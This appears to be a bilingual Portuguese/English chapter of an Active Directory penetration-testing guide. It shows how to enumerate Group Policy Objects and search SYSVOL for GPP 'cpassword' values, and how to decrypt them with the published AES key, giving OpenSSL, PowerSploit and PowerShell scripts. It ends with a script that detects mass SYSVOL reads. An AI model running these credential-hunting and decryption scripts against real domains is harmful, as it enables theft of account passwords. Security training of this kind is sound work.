2. Contexto e Relevância / Context and Relevance Original

Um GPO que não está ligado a nada não afeta computadores, mas o objeto e o SYSVOL por trás dele continuam a existir. É aí que Groups.xml antigos e scripts esquecidos ficam à espera de ser encontrados. Mesmo GPOs desativados ou não ligados podem conter credenciais que já foram usadas em algum momento e que continuam válidas. O SYSVOL é legível por qualquer utilizador autenticado no domínio — é por design, mas significa que qualquer segredo lá deixado é acessível a todos. A GPO that isn't linked to anything doesn't affect computers, but the object and the SYSVOL behind it still exist. That's where old Groups.xml files and forgotten scripts sit around waiting to be found. Even disabled or unlinked GPOs can contain credentials that were used at some point and are still valid. SYSVOL is readable by any authenticated domain user — that's by design, but it means any secret left there is accessible to everyone.

3. GPOZaurr — Enumeração de GPOs Original

O módulo GPOZaurr permite enumerar todos os GPOs do domínio e ver o seu estado: Empty (sem definições), Linked (ligado a algo) e Enabled (ativo). Um GPO pode ter definições mas não estar ligado a nada — não faz nada, mas o objeto e o SYSVOL persistem. The GPOZaurr module lets you enumerate all GPOs in the domain and see their status: Empty (no settings), Linked (linked to something), and Enabled (active). A GPO can have settings but not be linked to anything — it does nothing, but the object and SYSVOL persist. 
PS > Import-Module GPOZaurr
PS > Get-GPOZaurr | Format-Table DisplayName, DomainName, Empty, Linked, Enabled -AutoSize

4. Links e OUs de Alto Valor Original

Um GPO só afeta computadores se estiver ligado a um domínio, site ou OU. O Get-GPOZaurrLink mostra onde cada GPO está ligado. O Domain Controllers OU é o alvo de maior valor — um GPO ligado aí pode afetar todos os DCs. A GPO only affects computers if it's linked to a domain, site, or OU. Get-GPOZaurrLink shows where each GPO is linked. The Domain Controllers OU is the highest-value target — a GPO linked there can affect all DCs. 
PS > Get-GPOZaurrLink | Format-Table DisplayName, CanonicalName, Enabled, Enforced -AutoSize
Para listar os computadores numa OU específica: To list computers in a specific OU: 
PS > Get-ADComputer -SearchBase "OU=Workstations-Temp,DC=sekvoya,DC=local" -Filter * | Select-Object Name, DistinguishedName

5. Listar Ficheiros no SYSVOL Original

O Get-GPOZaurrFiles não consulta o AD — lista a árvore real da pasta Policies no SYSVOL. É aqui que encontras Groups.xml com cpassword, logon.bat, e templates ADM esquecidos. Qualquer utilizador de domínio pode abrir estas pastas no Explorer. Get-GPOZaurrFiles doesn't query AD — it lists the actual Policies folder tree in SYSVOL. This is where you find Groups.xml with cpassword, logon.bat, and forgotten ADM templates. Any domain user can open these folders in Explorer. 
PS > Get-GPOZaurrFiles | Format-Table GPOName, FullName, Length -AutoSize

6. cpassword — O Clássico GPP Password Original Complementar

O Group Policy Preferences (GPP) permitia aos administradores definir passwords de contas locais via SYSVOL. Essas passwords eram guardadas em XML (`Groups.xml`, `Services.xml`, `ScheduledTasks.xml`, etc.) encriptadas com AES-256, mas a Microsoft publicou a chave em 2012. Qualquer utilizador de domínio com acesso de leitura ao SYSVOL pode desencriptar o valor cpassword. Group Policy Preferences (GPP) allowed administrators to set local account passwords via SYSVOL. Those passwords were stored in XML (`Groups.xml`, `Services.xml`, `ScheduledTasks.xml`, etc.) encrypted with AES-256, but Microsoft published the key in 2012. Any domain user with read access to SYSVOL can decrypt the cpassword value.

6.1 Encontrar cpassword / Find cpassword

PS > findstr /S /I cpassword \\DOMAIN\SYSVOL\DOMAIN\policies\*.xml
Ou em PowerShell nativo: Or in native PowerShell: 
PS > Get-ChildItem \\DOMAIN\SYSVOL\ -Recurse -Include *.xml | Select-String cpassword

7. Desencriptação de cpassword Complementar

A chave AES é pública. Podes desencriptar com OpenSSL, gpp-decrypt, ou o módulo Get-GPPPassword do PowerSploit. The AES key is public. You can decrypt with OpenSSL, gpp-decrypt, or PowerSploit's Get-GPPPassword module. 
# Com OpenSSL
echo 'CPASSWORD_BASE64' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000

# Com PowerSploit
PS > Import-Module .\Get-GPPPassword.ps1
PS > Get-GPPPassword

8. Scripts de Impacto / Impact Scripts Impacto Complementar

Os scripts abaixo consolidam a enumeração de GPOs e a caça a cpassword. The scripts below consolidate GPO enumeration and cpassword hunting.

8.1 Script 28.1 — Enumeração de GPOs / GPO Enumeration

# Script 28.1 - GPO Enumeration
$out = ".\gpo-enum.csv"
Import-Module GPOZaurr -EA SilentlyContinue
if (Get-Command Get-GPOZaurr -EA SilentlyContinue) {
  Get-GPOZaurr | Select-Object DisplayName, DomainName, Empty, Linked, Enabled |
    Export-Csv $out -NoTypeInformation -Encoding UTF8
  Write-Host "[+] GPOs enumerated -> $out" -ForegroundColor Green
} else {
  Write-Host "[!] GPOZaurr module not available" -ForegroundColor Yellow
}

8.2 Script 28.2 — Caça a cpassword no SYSVOL / cpassword Hunt

# Script 28.2 - cpassword Hunt
param([string]$Domain = $env:USERDNSDOMAIN)
$out = ".\cpassword-hunt.csv"
$sysvol = "\\$Domain\SYSVOL\$Domain\Policies"
$hits = @()
if (Test-Path $sysvol) {
  Get-ChildItem $sysvol -Recurse -Include *.xml -EA SilentlyContinue |
    ForEach-Object {
      $content = Get-Content $_.FullName -Raw
      if ($content -match "cpassword") {
        $hits += [PSCustomObject]@{ File=$_.FullName; Contains="cpassword" }
      }
    }
}
$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
Write-Host "[+] cpassword files: $($hits.Count) -> $out" -ForegroundColor Red
$hits | Format-Table -AutoSize

8.3 Script 28.3 — Desencriptação GPP em PowerShell / GPP Decryption

# Script 28.3 - GPP Decryption (reference)
param([string]$Cpassword)
$AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
$AesIV = New-Object Byte[]($AesKey.Length)
$Aes = [System.Security.Cryptography.Aes]::Create()
$Aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$Aes.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
$Aes.Key = $AesKey
$Aes.IV = $AesIV
$Decryptor = $Aes.CreateDecryptor()
$EncryptedBytes = [System.Convert]::FromBase64String($Cpassword)
$DecryptedBytes = $Decryptor.TransformFinalBlock($EncryptedBytes, 0, $EncryptedBytes.Length)
[System.Text.Encoding]::Unicode.GetString($DecryptedBytes).TrimEnd([char]0)

8.4 Script 28.4 — Deteção de Leitura Massiva do SYSVOL / Mass SYSVOL Read Detection

# Script 28.4 - Mass SYSVOL Read Detection (heuristic)
$out = ".\sysvol-read-detect.csv"
$hits = @()
Get-WinEvent -LogName Security -MaxEvents 3000 -EA SilentlyContinue |
  Where-Object { $_.Id -eq 5145 } | ForEach-Object {
    $xml = [xml]$_.ToXml()
    $share = ($xml.Event.EventData.Data | Where-Object Name -eq "ShareName").'#text'
    $file  = ($xml.Event.EventData.Data | Where-Object Name -eq "RelativeTargetName").'#text'
    if ($share -match "SYSVOL" -and $file -match "\.xml$") {
      $hits += [PSCustomObject]@{ Time=$_.TimeCreated; File=$file }
    }
  }
$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
Write-Host "[+] SYSVOL XML reads: $($hits.Count) -> $out" -ForegroundColor Yellow
